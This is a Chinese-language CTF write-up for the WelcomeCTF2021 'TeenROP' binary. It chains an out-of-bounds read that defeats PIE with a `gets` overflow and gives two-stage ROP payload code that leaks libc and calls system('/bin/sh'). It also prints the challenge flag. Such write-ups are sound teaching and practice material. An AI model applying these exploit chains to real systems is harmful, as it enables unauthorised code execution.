# TeenROP

## 题目简述

WelcomeCTF2021 的 TeenROP 是带 PIE 的两阶段 ROP。电话簿菜单对 `nums[16]` 的索引没有边界检查，可以先越界读取主程序地址；读取数字的 `read_ull` 又在 32 字节缓冲区上调用 `gets`，可继续覆盖返回地址。目标是依次恢复 PIE 与 libc 基址。

## 解题过程

先选择读取联系人，使用官方脚本对应的越界下标 17。该槽位泄漏出主模块内地址，和静态分析得到的偏移 `0x1140` 相减即可得到 PIE 基址：

```python
io.sendline("2")
io.sendline("17")
io.recvuntil(b"Value: ")
leak = int(io.recvline())
elf.address = leak - 0x1140
```

有了 PIE 基址，`puts@got`、`puts@plt`、`pop rdi; ret` 和 `read_ull` 的运行时地址都能由 ELF 符号计算。再次进入读取流程，在程序等待索引时向 `read_ull` 发送 40 字节填充和第一阶段 ROP：

```python
stage1 = b"A" * 40
stage1 += p64(pop_rdi_ret)
stage1 += p64(elf.got["puts"])
stage1 += p64(elf.plt["puts"])
stage1 += p64(elf.symbols["read_ull"])
```

泄漏 `puts` 后计算 libc 基址，再构造第二阶段：

```python
libc.address = puts_runtime - libc.symbols["puts"]

stage2 = b"A" * 40
stage2 += p64(ret_gadget)
stage2 += p64(pop_rdi_ret)
stage2 += p64(next(libc.search(b"/bin/sh\0")))
stage2 += p64(libc.symbols["system"])
```

这里先利用越界读解除 PIE，再利用 GOT 泄漏解除 libc ASLR，最后取得：

```text
greyhats{y0u_4r3_g3tt1ng_g00d_4t_th1s_983u49r}
```

## 方法总结

TeenROP 把两类原语串联起来：数组越界读提供模块基址，栈溢出提供控制流，第一段 ROP 再提供 libc 基址。每个地址都应表示成“运行时基址 + 静态偏移”，这样利用才不会依赖一次偶然的地址布局。
